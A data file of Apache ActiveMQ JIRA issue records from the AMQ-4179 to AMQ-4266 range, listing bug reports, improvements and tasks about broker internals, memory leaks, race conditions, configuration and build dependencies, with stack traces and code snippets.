java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:601) at org.jolokia.converter.json.BeanExtractor.extractBeanPropertyValue(BeanExtractor.java:237) ... 47 more Caused by: org.apache.activemq.ConnectionClosedException: The connection is already closed at org.apache.activemq.ActiveMQConnection.checkClosed(ActiveMQConnection.java:1462) at org.apache.activemq.ActiveMQConnection.checkClosedOrFailed(ActiveMQConnection.java:1449) at org.apache.activemq.ActiveMQConnection.getMetaData(ActiveMQConnection.java:432) ... 52 more "}
issueID:AMQ-4179
type:Bug
changed files:
texts:can&#39;t install activemq-extra feature
You can"t install the activemq-extra feature currently:karaf@root> features:install activemq-extra Error executing command: Can not resolve feature:Unsatisfied requirement(s):---------------------------   package&(package=org.fusesource.hawtdispatch.transport)(version>=1.12.0))      mqtt-client   package&(package=org.fusesource.hawtdispatch.util)(version>=1.12.0))      mqtt-clientThis is because mqtt-client 1.4 has a dependency on hawtdispatch 1.12. This is not a problem in any released version.
issueID:AMQ-4180
type:Improvement
changed files:ActiveMQMapMessage.java
pom.xml
ActiveMQMessage.java
MarshallingSupport.java
TypeConversionSupport.java
texts:Use hawtbuf in activemq-client to make message properties and MapMessage body unmarshal more lazy
Message properties and MapMessage body already use a lazy unmarshal strategy.  We can use hawtbuf UTF8Buffer objects to unmarshal the bytes of a string properties or map value and only do the UTF-8 decode back to a String instance when needed.  In some contrived test cases I was able to get an extra 100 msgs/sec through my consumers when they only read out a portion of the payload of large MapMessage instance.
issueID:AMQ-4181
type:Bug
changed files:
texts:JMS queue browser returns only page size number of messages
When the number of messages in the queue is larger than set page size, the jms queue browser will get one page size of messages (200 by default).Ideally we"d want to send all the messages or at least until we reach the memory limit set for the queue/broker.
issueID:AMQ-4182
type:Bug
changed files:ActiveMQBytesMessage.java
texts:Memory Leak for ActiveMQBytesMessage with Compression as true
InflaterInputStream is supposed to close explicitly to release resource allocated by its JNI methods. In ActiveMQBytesMessage, dataIn property is disposed simply without closing it, which results in some weird memory leak that can"t be detected from heap size. It can"t be controlled by -Xmx or -XX:MaxDirectMemorySize.Please run the following test program to verify the issue:import java.util.concurrent.TimeUnit;import javax.jms.BytesMessage;import javax.jms.Connection;import javax.jms.Session;import org.apache.activemq.ActiveMQConnectionFactory;import org.apache.activemq.command.ActiveMQBytesMessage;/** A simple test to verify memory leak in ActiveMQBytesMessage. */public class Main{    public static void main(String[] args) throws Exception     {        ActiveMQConnectionFactory connFactory = new ActiveMQConnectionFactory("vm://localhost");        connFactory.setUseCompression(true);        Connection conn = connFactory.createConnection();        Session session = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);        BytesMessage message = session.createBytesMessage();        message.writeBytes(new byte&#91;1024&#93;);        ActiveMQBytesMessage m = (ActiveMQBytesMessage)message;        if(!m.isCompressed())        {            throw new RuntimeException();        }        while (true)        {            for (int k = 0; k < 1024; ++k)            {                message.reset();                byte[] data = new byte[1024];                message.readBytes(data);            }            TimeUnit.MILLISECONDS.sleep(10);        }    }}
issueID:AMQ-4183
type:Bug
changed files:MultiKahaDBPersistenceAdapter.java
IOHelper.java
texts:AMQ 5.7 lost long queue names with filteredKahaDB
Using AMQ 5.7 with filteredKahaDB and perDestination="true". I send persistent messages to a queue with a long name (more than 60 chars in the name). After broker restart this queue is not there anymore.It seems that kahadb is generating a truncated directory for that queue. The directory name is missing first letters. For short queue names, directory start with something like "queue#3a#2f#2f....", but for long queue names directory start with "#2f#2f...".
issueID:AMQ-4186
type:Bug
changed files:
texts:web-console xml views have duplicate contenttype headers - jsp errors
with the latest dependencies we get:2012-11-22 12:20:52,678 | WARN | qtp2848306-261 | ServletHandler | lipse.jetty.util.log.JavaUtilLog 70 | 121 - org.eclipse.jetty.util - 7.6.7.v20120910 | /activemqweb/xml/topics.jsporg.apache.jasper.JasperException: /xml/topics.jsp(1,1) PWC5988: Page directive: illegal to have multiple occurrences of contentType with different values (old: text/html;charset=UTF-8, new: text/xml;charset=ISO-8859-1)at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:78)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:373)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:201)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.Validator$DirectiveVisitor.visit(Validator.java:171)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.Node$PageDirective.accept(Node.java:599)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2291)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2341)[143:org.ops4j.pax.web.pax-web-jsp:1.1.9]The duplicate contentyType directive seems to only error out with the current jsp compiler.
issueID:AMQ-4188
type:New Feature
changed files:
texts:ActiveMQ Karaf Command for overview of queues alike what you see in the web console
We have activemq:list to show the names of the brokers.We have activemq:bstat to show very verbose stats for the brokerWe have activemq:browse to browse a broker of choiceBut we need a simple command to show a list of queues/topics and their current depth count, consumers, etc. eg a table just like the web console does.
issueID:AMQ-4190
type:Improvement
changed files:Topic.java
texts:Figure out what was intended with transactions and producer flow control for topics
in Topic#send it checks to see whether memory is full, whether producer flow control is enabled, and whether it should just block the producer, or block the connection. In the "else" clause on line 389, it will block the connection waiting for space. It tries to do something different if the context is in a transaction.. but what it"s trying to do is not clear. It looks like it will do exactly the same thing as it would do if it would not be in a transaction. The extra code around (count > 2) doesn"t seem like it will ever hit and the log message will never print. Maybe someone was adding functionality there, but didn"t finish?
issueID:AMQ-4191
type:New Feature
changed files:StatusViewMBean.java
OpenTypeSupport.java
BrokerService.java
StatusEvent.java
ManagedRegionBroker.java
StatusView.java
texts:have a getHappyStatus() method on the BrokerViewMBean so that tools can enquire on the happy status of a broker to see early warning signs of things that could be bad
It would be good to have a kinda "happy page" for an ActiveMQ broker that could list all things which may be an issue or warning.e.g. listing all the things which may be a concern, such as slow consumers memory reaching exhaustion running out of diskover time it would be good to catch as many "warning signs" as posible. Am sure there are many others.
issueID:AMQ-4195
type:Bug
changed files:BstatCommand.java
texts:activemq-admin bstat command predefined query isn&#39;t even run
The output for "bstat" and the "query command without any params" are exactly the same for activemq-admin. This is because the query intended to be run for bstat is never run. A closer look shows that the parameters passed to the runTask() method of QueryCommand are never used. The QueryCommand.queryAddObjects field is what"s used to determine what objects to query and for the bstat command, those are never properly parsed.
issueID:AMQ-4196
type:Bug
changed files:
texts:Race condition between removal of subscriptions and removal of destinations in a network of brokers
n a broker network like this: A <-> B <--> CScenario:A producer to BrokerA creates a message, sets its replyTo header to a temp destination that it creates and listens on, then sends the message off to broker A. The message is demand forwarded to BrokerC because there is a consumer there that consumes the message and replies to the temp dest in the replyTo header.As the number of concurrent producers on BrokerA sending these messages increases, the subscription to the temp destination that was demand forwarded will not be cleaned up properly on BrokerC. The reason for this is the DemandForwardingBridge runs the remove consumer code in a separate thread. But if a "remove destination" advisory messages comes in, it will remove the destination from the AdvisoryBroker"s destination map. So if this happens before the code for removeConsumer runs (in AdvisoryBroker), then the destination will not be in the destination map and the advisory for removeConsumer will not fire.The net result is a subscription leak in the network bridge on B & CThe junit test shows two issues:1) the subscriptions leaked when concurrent producers using request/reply and correctly closing the consumer and connection2) all subscriptions leaked when using a single producer with request/reply and closing only the connection, and not the consumer explicitlyIssue 2 is related to temp destinations only and is compounded by https://issues.apache.org/jira/browse/AMQ-3879
issueID:AMQ-4198
type:Improvement
changed files:AdvisoryBroker.java
texts:Include username in ConnectionInfo for ActiveMQ.Advisory.Connection messages
When ConnectionInfo messages come through, the userName and password are being taken out. Let"s just take out the password and leave the userName. From this mailing list:http://activemq.2283324.n4.nabble.com/How-can-I-retrieve-a-Stomp-username-when-a-new-Connection-is-made-td4659949.htmlAnd:http://activemq.2283324.n4.nabble.com/ActiveMQ-Advisory-Connection-messages-includes-username-and-password-td2365496.html
issueID:AMQ-4200
type:New Feature
changed files:
texts:STOMP 1.1 Over WebSocket
Update the websocket example to use the latest stomp.js which supports STOMP 1.1 (including heart-beating). The js file was taken from https://raw.github.com/jmesnil/stomp-websocket/master/dist/stomp.js.
issueID:AMQ-4201
type:Bug
changed files:ActiveMQMessage.java
texts:JMSX* properties not included in the getPropertyNames() enumeration
None
issueID:AMQ-4202
type:Improvement
changed files:ActiveMQConnectionMetaData.java
texts:JMSXUserID missing from ActiveMQConnectionMetaData getter
None
issueID:AMQ-4205
type:Improvement
changed files:SelectorManager.java
TaskRunnerFactory.java
AbstractInactivityMonitor.java
texts:Expose thread pool configuration
Default thread pool timeout can be too low which in turn causes excessive thread death and re-creation in AbstractInactivityMonitor.java (default 10 seconds) and TaskRunnerFactory.java (default 30 seconds).It would be great if these pools were configurable.The target to aim for is that pooled threads never die under normal load ("normal" being use case specific). See http://activemq.2283324.n4.nabble.com/InactivityMonitor-Creating-too-frequent-threads-td4656752.html#a4659878
issueID:AMQ-4206
type:Task
changed files:
texts:HawtBuf lib in assembly is put into /extra folder when it&#39;s not optional
TypeConverionsSupport does conversions for primitive wrappers and as of (https://issues.apache.org/jira/browse/AMQ-4180) it does conversions for HawtBuf"s UTF8Buffer. The HawtBuf library should be moved out from /extra and into the /lib for the distribution.see message forum:http://activemq.2283324.n4.nabble.com/ActiveMQ-5-8-SNAPSHOT-problems-connecting-to-older-versions-tt4660039.html#a4660205
issueID:AMQ-4209
type:Bug
changed files:
texts:NetworkConnector and NetworkBridgeConfiguration have same named private variables for excludedDestination
NetworkConnector extends from NetworkBridgeConfiguration. Both NetworkConnector and NetworkBridgeConfiguration have private fields named "private List<ActiveMQDestination> excludedDestinations" Not only is it confusing which list ends up being used to configure the bridge, but duplex connectors could have a bug because of this. I"ll write a test to reproduce.
issueID:AMQ-4212
type:Bug
changed files:
texts:Broker may be unable to recover durable topic subscription from the kahadb journal
KahaDB is supposed to recover its index from the journal completely. Such recovery can be enforced by stopping the broker, deleting the db.data index file and restarting the broker. The recovery process may however not be able to recover inactive durable topic subscriptions. This is because the kahadb cleanup task will not consider any active subscription entries in the journal files when marking journal files for deletion. E.g. If a durable sub info was written to e.g. the journal file db-1.log but kahadb has already rolled over to writing to db-2.log, the cleanup task may delete db1.log (in case all msgs in db1.log got acked). The durable sub however is still alive. When stopping the broker this durable sub info is still present in the index file and will be restored at broker restart.If however the index file gets deleted in order to enforce a recovery of the index from the journal, then the broker has lost the information about this durable sub.The broker is therefore not able to recover its state fully from the journal files.If the durable subscriber remains inactive (i.e. does not reconnect to broker immediately after broker restart), it may miss messages as the broker has no knowledge of this durable sub.
issueID:AMQ-4213
type:Improvement
changed files:
texts:ActiveMQMessageProducer sends producer registration async which causes it to miss possible exceptions on creation like security exceptions.
When creating a producer the ActiveMQMessageProducer sends its producer info asynchronously which can cause it to not propagate exceptions back to the client like Security exceptions and it won"t remove itself from the session right away.  This should be sent sync so that these errors are propagated correctly to the client.
issueID:AMQ-4215
type:Bug
changed files:
texts:Simplify PList interface and provide a LevelDB store implementation.
None
issueID:AMQ-4218
type:Bug
changed files:
texts:JMS selector statement not displayed correctly in subscribers web view if contains XML-prohibited characters
The issue reported affects two similar use cases: XML view of JMS subscribers is rendered with syntax errors if any of the subscribers has a selector containing an XML-prohibited character in its statement, e.g. PROPERTY <> VALUE selector statement contains < and > characters that cause XML syntax errors HTML view of JMS subscribers does not properly display the selector statement if it contains any of the XML-prohibited characters in it, e.g. PROPERTY <> VALUE will be displayed as PROPERTY VALUE - both the < and > characters are stripped outThe solution is to use the <c:out value=""/> syntax whenever an XML-unescaped string is to be outputted - the c:out has the escapeXml property set to true by default which does the trick.I have attached the patch that fixes the XML escaping for JMS selector. Please note that I could not find any JMS naming specification to make sure whether the JMS selector is the only field that is allowed to contain XML-prohibited characters. Therefore I would advise the patch reviewer to figure  out whether this fix should also be applied to JMS Client ID, Connection ID, Destination Name and Subscription name fields.
issueID:AMQ-4219
type:New Feature
changed files:
texts:Expose ActiveMQ JMX interface via REST API using Jolokia
Jolokia project (http://www.jolokia.org/) provides a nice way to expose JMX via REST API
issueID:AMQ-4221
type:Bug
changed files:
texts:NPE plist (temp) sparse removal - filependingmessagecursor with selector and expiry
2012-12-13 11:37:27,027 [calhost] Task-1] - ERROR Queue                          - Failed to page in more queue messages java.lang.NullPointerException at org.apache.kahadb.index.ListNode.access$200(ListNode.java:37) at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:265) at org.apache.kahadb.index.ListNode$NodeMarshaller.writePayload(ListNode.java:255) at org.apache.kahadb.page.Transaction.store(Transaction.java:248) at org.apache.kahadb.index.ListIndex.storeNode(ListIndex.java:326) at org.apache.kahadb.index.ListNode.store(ListNode.java:332) at org.apache.kahadb.index.ListNode.access$500(ListNode.java:37) at org.apache.kahadb.index.ListNode$ListIterator.remove(ListNode.java:227) at org.apache.activemq.store.kahadb.plist.PList$PListIterator$1.execute(PList.java:229) at org.apache.kahadb.page.Transaction.execute(Transaction.java:771) at org.apache.activemq.store.kahadb.plist.PList$PListIterator.remove(PList.java:226) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor$DiskIterator.remove(FilePendingMessageCursor.java:517) at org.apache.activemq.broker.region.cursors.FilePendingMessageCursor.remove(FilePendingMessageCursor.java:321) at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1735) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1948) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1465) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:680)
issueID:AMQ-4222
type:Bug
changed files:
texts:ProducerBrokerExchange holds reference to "region" destination after message has been sent
So in the case of temp destinations, if a producer produces to the temporary destination, and the messages don"t get consumed right away, but the temp dest goes away, the ProducerBrokerExchange in the TransportConnection for the producer"s connection will still hold the reference to the destination which will keep it from being GCd properly. Test forthcoming...
issueID:AMQ-4224
type:Bug
changed files:
texts:Setting queue policy queuePrefetch=0 in broker configuration causes messages to stay in pending state in broker - the messages aren&#39;t consumed
Broker prefetch config <policyEntry queue="XX" ... queuePrefetch="0"> takes effect if the consumerInfo contains the default  value (1000), indicating that it does not have a preference.However in the case that the broker chooses 0, to make all consumers pull messages, this information needs to be propagated back to the consumer to allow the receive(..) call to initiate a pull. Currently it is conditional on the consumer prefetch value == 0 which is currently not updated.The fix is to have the broker send a connection control message to update the prefetch when broker config uses 0, and have the receive(..) call check the current prefetch value.
issueID:AMQ-4225
type:Improvement
changed files:
texts:PooledConnectionFactory should track Session checkouts and close associated resources
When the user"s code closes a Connection checked out from the pool, I would expect activemq-pool to close Sessions, MessageConsumers and MessageProducers that were created from it. Unfortunately, activemq-pool only cleans up Sessions on Connection.close() when no one else is referencing the Connection (referenceCount == 0). This makes Sessions, Consumers and Producers outlive the code that actually uses them, thus leading to increased resource consumption and messages being trapped in prefetch buffers that are no longer monitored.Instead, we should keep track of the Sessions that were created from each specific Connection checkout, and close them when the borrowed Connection is closed.Otherwise we bump into situations like SPR-10092 when using Spring"s DefaultMessageListenerContainer. In some cases DMLC "forgets" to explicitly close MessageConsumers and Sessions, even though Connections are always closed, but the pool doesn"t take care of cleaning up associated sessions.
issueID:AMQ-4226
type:Bug
changed files:
texts:Broker destination zero prefetch and RAR endpoint listener are incompatible b/c RAR is starved of messages - log an error to highlight
A broker configured zero prefetch will starve the RAR of messages. The consumer is now aware of the zero prefetch and will log an error if it sees a prefetch value of zero.RAR is push only so it needs to have a prefetch > 0 for normal operation. Setting prefetch to zero broker size is a way of preventing dispatch if necessary.
issueID:AMQ-4227
type:Bug
changed files:
texts:ActiveMQSslConnectionFactory does not allow for regular files to be found unless a valid URL is provided or is located on the classpath
The factory class does not allow one to pass a keystore or truststore file name that is not a properly formatted URL string or is located within the classpath.  The problem is that the getUrlOrResourceAsStream method does not take into account a regular file name.The patch includes a fix that provides that ability without removing the ability to pass a valid URL string or having the store be located within the client classpath.
issueID:AMQ-4228
type:Task
changed files:
texts:implement/investigate persistent producer audit for leveldb store
LeveDB variant of org.apache.activemq.transport.failover.FailoverTransactionTest#testFailoverConnectionSendReplyLost and org.apache.activemq.transport.failover.FailoverTransactionTest#testFailoverSendReplyLost fail, these verify the persistent producer audit feature
issueID:AMQ-4233
type:Improvement
changed files:ActiveMQMessageAudit.java
ActiveMQMessageAuditNoSync.java
texts:Allow ActiveMQMessageAudit to have cache value for producers set for lower values
Setting the number of producers to cache for ActiveMQAudit does not affect the underlying LRUCache properly, so the cache is never really reduced in size.
issueID:AMQ-4234
type:Bug
changed files:
texts:Broker destination policy prefetch value is ignored by stomp consumers
Introduced in https://issues.apache.org/jira/browse/AMQ-3895we use a prefetch value of 0 to ensure no dispatch till we get can receipt the sub. But we may need to find a better way.Such that the prefetch values can be default on the way in and get applied by the broker.Also, our default values should mirror the broker defaults based on destination and sub type, currently the all default to 1000.
issueID:AMQ-4237
type:Improvement
changed files:
texts:JMX ObjectNames do not follow JMX Best practices to use a Hierarchical format
The Current JMX ObjectNames result in a disjointed view from JConsole of the managed objects and services of the ActiveMQ Broker. By following best practices, it will be easier to find and monitor all the endpoints associated with a Destination - for example.
issueID:AMQ-4238
type:Task
changed files:ManagementContext.java
texts:Check AMQ JMX connector code if having same issue as CAMEL-5907
Seehttps://issues.apache.org/jira/browse/CAMEL-5907We may need similar fix at AMQ.
issueID:AMQ-4241
type:Improvement
changed files:
texts:ActiveMQOutputStream shoud reserve the user property only once
ActiveMQOutputStream should only reserve the properties from the end user by the first message instead of reserving the properties by every message under the hood.While ActiveMQInputStream can obtain those properties by the first incoming message.By the way, the exposed call of the receive method to the end user is dangerous becausethe user call on the receive method will cause the data the user received is not thewhole. The payload of the message that the call returns is lost because it"s out of theunderlying stream.
issueID:AMQ-4246
type:Bug
changed files:BrokerService.java
texts:Change Type of offlineDurableSubscriberTimeout and offlineDurableSubscriberTaskSchedule to long
activemq.xml:The Broker Attributes offlineDurableSubscriberTimeout and offlineDurableSubscriberTaskSchedule expect Time in Milliseconds.I tried to enter a Number greater than 2147483647 and get an NumberFormatException because this isn"t a Integer anymore.If this fields expect Time in Milliseconds, they should be long.
issueID:AMQ-4248
type:Bug
changed files:StoreDurableSubscriberCursor.java
TopicSubscription.java
MessageDispatch.java
TransmitCallback.java
TransportConnection.java
PrefetchSubscription.java
texts:FilePendingMessageCursor can retain memory after flush to disk till next reset via internal iterator
the contract for cursor iteration is to call reset,next...,release If the cursor is flushed on add, the memory list is cleared but the iterator is still referencing the list, which causes memory bloat. It will be released on the next call to reset (which may take some time depending on consumer activity), but it should be gone after the previous call to release.
issueID:AMQ-4249
type:Bug
changed files:
texts:Race condition in PropertiesLoginModule
ProblemWhile setting up a connection pool towards ActiveMq 5.5.1 using Bitronix 2.1.3 I"ve been having some issues related to authentication and authorization of the JMS connections.When doing a clean restart of the JMS-clients JVM the connection pool has been unable to connect successfully with one or more of the 14 connections it"s been set up to use.The error messages I"ve been getting has usually been one of the following two: User system is not authorized to read from: ActiveMQ.Advisory.TempQueue,ActiveMQ.Advisory.TempTopic User name or password is invalid.The broker has been set up using a very simplistic configuration:<?xml version="1.0" encoding="UTF-8"?><beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xsi:schemaLocation="http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core-5.5.0.xsd  http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd  http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd"> <context:property-placeholder /> <broker brokerId="localhost" xmlns="http://activemq.apache.org/schema/core"  dataDirectory="${datadir}" start="false">  <managementContext>   <managementContext connectorHost="0.0.0.0"    connectorPort="14522" createConnector="true" />  </managementContext>  <plugins>   <jaasAuthenticationPlugin configuration="activemq-domain"    discoverLoginConfig="true" />   <authorizationPlugin>    <map>     <authorizationMap>      <authorizationEntries>       <authorizationEntry queue=">" read="admins"        write="admins" admin="admins" />       <authorizationEntry topic=">" read="admins"        write="admins" admin="admins" />       <authorizationEntry topic="ActiveMQ.Advisory.>"        read="guests,users" write="guests,users" admin="guests,users" />      </authorizationEntries>     </authorizationMap>    </map>   </authorizationPlugin>  </plugins>  <transportConnectors>   <transportConnector id="openwire" uri="tcp://0.0.0.0:61616?trace=true" />  </transportConnectors> </broker></beans>The JAAS-configuration has been verified to match username and password used by the client when connecting (username = system):login.configactivemq-domain {    org.apache.activemq.jaas.PropertiesLoginModule required        debug=false        org.apache.activemq.jaas.properties.user="users.properties"        org.apache.activemq.jaas.properties.group="groups.properties";};users.propertiessystem=manageruser=passwordguest=passwordgroups.propertiesadmins=systemusers=userguests=guestCauseAfter debugging the problem it seems as if the problem is caused by a race condition introduced in PropertiesLoginModule in revision 1086219 (AMQ-3244). When the reload-support was added the users- and groups-fields were changed into static fields. But no additional synchronization was introduced, thereby introducing a race condition when several threads are entering the initialize- and commit-methods are the same time.The following section of the initialize-method in PropertiesLoginModule contains the first part of the race condition. Please note the unsynchronized modification of both the users- and groups static fields:        if (reload || users == null || uf.lastModified() > usersReloadTime) {            if (debug) {                LOG.debug("Reloading users from " + uf.getAbsolutePath());            }            try {                users = new Properties(); // XXX Here be dragons                java.io.FileInputStream in = new java.io.FileInputStream(uf);                users.load(in);                in.close();                usersReloadTime = System.currentTimeMillis();            } catch (IOException ioe) {                LOG.warn("Unable to load user properties file " + uf);            }        }        groupsFile = (String) options.get(GROUP_FILE) + "";        File gf = baseDir != null ? new File(baseDir, groupsFile) : new File(groupsFile);        if (reload || groups == null || gf.lastModified() > groupsReloadTime) {            if (debug) {                LOG.debug("Reloading groups from " + gf.getAbsolutePath());            }            try {                groups = new Properties(); // XXX Here be dragons                java.io.FileInputStream in = new java.io.FileInputStream(gf);                groups.load(in);                in.close();                groupsReloadTime = System.currentTimeMillis();            } catch (IOException ioe) {                LOG.warn("Unable to load group properties file " + gf);            }        }The next part comes in the login-method when the users password is retrieved:        String password = users.getProperty(user); The final part of the puzzle occurs in the commit-method:            for (Enumeration<?> enumeration = groups.keys(); enumeration.hasMoreElements();) {                String name = (String)enumeration.nextElement();                String[] userList = ((String)groups.getProperty(name) + "").split(",");                for (int i = 0; i < userList.length; i++) {                    if (user.equals(userList[i])) {                        principals.add(new GroupPrincipal(name));                        break;                    }                }            }The retrieval of the user password will fail if invoked by a thread immediately after a different thread has assigned an empty Properties-object to the users field in the initialize-method.Similarly population of the GroupPrincipals into the Subject in the commit-method will silently fail if executed by a thread immediately after a different thread has assigned an empty Properties-object to the groups-field in the initialize-method.Proposed solutionI"ve created a testcase that reproduces the problem and an additional patch that introduces a wrapper around the Properties-objects for the users- and groups-fields.The testcase and the proposed solution is available via https://github.com/lothor/activemq.
issueID:AMQ-4250
type:Improvement
changed files:
texts:activemq-spring - Should not depend on spring-test at compile scope
See nabblehttp://activemq.2283324.n4.nabble.com/why-activemq-spring-depends-on-spring-text-scope-compile-tp4661652.html;cid=1357980967446-4
issueID:AMQ-4251
type:Task
changed files:
texts:Scala compile warnings - Compiling activemq-leveldb-store
Noticed a bunch of warnings from the scala compiler&#91;INFO&#93; compiler plugin: BasicArtifact(org.fusesource.jvmassert,jvmassert,1.4,null)&#91;WARNING&#93; /Users/davsclaus/workspace/activemq/activemq-leveldb-store/src/main/scala/org/apache/activemq/leveldb/DBManager.scala:255: warning: non-variable type argument Long in type pattern (Long, Int) is unchecked since it is eliminated by erasure&#91;WARNING&#93;       case x:(Long, Int) =>&#91;WARNING&#93;              ^&#91;WARNING&#93; /Users/davsclaus/workspace/activemq/activemq-leveldb-store/src/main/scala/org/apache/activemq/leveldb/LevelDBClient.scala:1103: warning: non-variable type argument Long in type pattern (Long, Int) is unchecked since it is eliminated by erasure&#91;WARNING&#93;                     case x:(Long, Int) => x&#91;WARNING&#93;                            ^&#91;WARNING&#93; /Users/davsclaus/workspace/activemq/activemq-leveldb-store/src/main/scala/org/apache/activemq/leveldb/LevelDBClient.scala:1124: warning: non-variable type argument Long in type pattern (Long, Int) is unchecked since it is eliminated by erasure&#91;WARNING&#93;                     case x:(Long, Int) => x&#91;WARNING&#93;                            ^&#91;WARNING&#93; /Users/davsclaus/workspace/activemq/activemq-leveldb-store/src/main/scala/org/apache/activemq/leveldb/LevelDBClient.scala:1167: warning: non-variable type argument Long in type pattern (Long, Int) is unchecked since it is eliminated by erasure&#91;WARNING&#93;                     case x:(Long, Int) => x&#91;WARNING&#93;                            ^&#91;WARNING&#93; warning: there were 6 feature warnings; re-run with -feature for details&#91;WARNING&#93; 5 warnings found
issueID:AMQ-4252
type:Task
changed files:pom.xml
SpringOsgiContextHook.java
texts:activemq-spring - Make OSGi JARs fully optional
It looks like the osgi code is not optional. Its in the same package with regular code.We should move all OSGi code to separate packages then the classloader will not load these classes when loading regular code. We do this in Camel.
issueID:AMQ-4253
type:Improvement
changed files:
texts:Upgrade to Spring 3.1.3
We are currently on Spring 3.0.7, which is DEAD.We should upgrade to Spring 3.1.3, which is also in use by Camel.
issueID:AMQ-4254
type:Bug
changed files:
texts:BrokerXmlConfigStartTest fails intermittently
BrokerXmlConfigStartTest.testStartBrokerUsingSampleConfig fails intermittently on Hudson/Jenkins with the error "Error creating bean with name "Server" defined in file &#91;/home/hudson/hudson-slave/workspace/ActiveMQ-Java7/assembly/target/conf/jetty-demo.xml&#93;: Invocation of init method failed; nested exception is java.net.BindException: Address already in use"I will attach a patch with this test rewritten as a JUnit4 Parameterized test. This creates runs each config as a separate test case and seems to resolve the broker start/stop issue.
issueID:AMQ-4256
type:Task
changed files:
texts:Upgrade to OSGi 4.3.0
We should upgrade osgi from 4.2 to 4.3.
issueID:AMQ-4257
type:Task
changed files:
texts:Upgrade to Aries 1.0
We should upgrade to Apache Aries 1.0.0.
issueID:AMQ-4258
type:Bug
changed files:AmqpProtocolConverter.java
texts:Endless loop when received incorrect AMQP message
When you send incorrect message to AMQP transform, it will stuck in endless loop and write lot of error messages to console output.This way, you can send numbers of incorrect messages and ActiveMQ will create new thread for each of them. This way can attacker create thousands of threads in few minutes and completely overload server machine.Problem is in org.apache.activemq.transport.amqp.AmqpProtocolConverter class. It throws exception(exception.txt) and loop never ends:Line 158:int count = protonTransport.input(frame.data, frame.offset, frame.length);Two solutions are possible:1. Add "return" statement to catch block (patch1.txt).2. Run "frame.moveHead(count);" in finally block with some default positive count (patch2.txt)I would prefer the first variant.This happens when you try to send message from client with older version of AMQP protocol.
issueID:AMQ-426
type:Improvement
changed files:ActiveMQInputStream.java
PooledConnection.java
ActiveMQSession.java
ActiveMQQueueReceiver.java
ActiveMQMessageConsumer.java
PooledProducer.java
ActiveMQConnectionConsumer.java
ActiveMQQueueBrowser.java
ActiveMQMessageProducer.java
PooledSession.java
ActiveMQConnection.java
ActiveMQOutputStream.java
texts:The jms connection, session, producer, and consumer object&#39;s toString() method should include their id values.
The broker side logging relates to client side objects by thier connectionId, sessionId, producerId and consumerId values.  But the client side does not provide an easy way to figure out what Id has been assigned to each of the JMS object.  This change would make it easier to correlate problems back to the client side objects.
issueID:AMQ-4260
type:Bug
changed files:
texts:MessageGroupLateArrivalsTest fails intermittently
MessageGroupLateArrivalsTest fails intermittently on some systems.  In the testConsumersLateToThePartyGetSomeNewGroups test, it looks like sometimes worker2 does not start in time, so worker1 consumes all of it"s messages.
issueID:AMQ-4261
type:Improvement
changed files:
texts:Please change logging message from INFO to WARN or ERROR when persistent store is full
We use KahaDB for ActiveMQ persistence.  When queue"s persistent store is full, a message such as the following is logged at the INFO level.We"d like to request the message to be logged at the ERROR or WARN level.  This is because production systems typically configures loggers to display messages at WARN level.  A situation such as this gets into deadlock and makes the application unusable.  Displaying the message at the ERROR or WARNlevel will provide visibility about the issue for typical production usage.2013-01-17 10:56:28,563 | INFO  | iveMQ Task-37644 | Queue                            | 118 - org.apache.activemq.activemq-core - 5.5.1.fuse-7-061 | Usage(default:store:queue://xrm-BundleStagingQ:store) percentUsage=99%, usage=1094475857, limit=1073741824, percentUsageMinDelta=1%;Parent:Usage(default:store)percentUsage=101%, usage=1094475857, limit=1073741824, percentUsageMinDelta=1%: Persistent store is Full, 100% of 1073741824. Stopping producer (ID:vlcov46.fmr.com-47345-1358284999111-4:6:2548:1) to prevent flooding queue://xrm-BundleStagingQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 29828s)
issueID:AMQ-4265
type:Bug
changed files:KahaDBPersistenceAdapter.java
texts:AMQ4220Test is failing
This test is failing with error:Failed to start per destination persistence adapter for destination: queue://TEST.QUEUE, options:[KahaDBPersistenceAdapter/home/jenkins/jenkins-slave/workspace/ActiveMQ-Java7/activemq-core/target/activemq-data/mKahaDB/queue#3a#2f#2fTEST.QUEUE, KahaDBPersistenceAdapter/home/jenkins/jenkins-slave/workspace/ActiveMQ-Java7/activemq-core/target/activemq-data/mKahaDB/queue#3a#2f#2fTEST.QUEUE]
issueID:AMQ-4266
type:Bug
changed files:
texts:missing proton-api as dependency
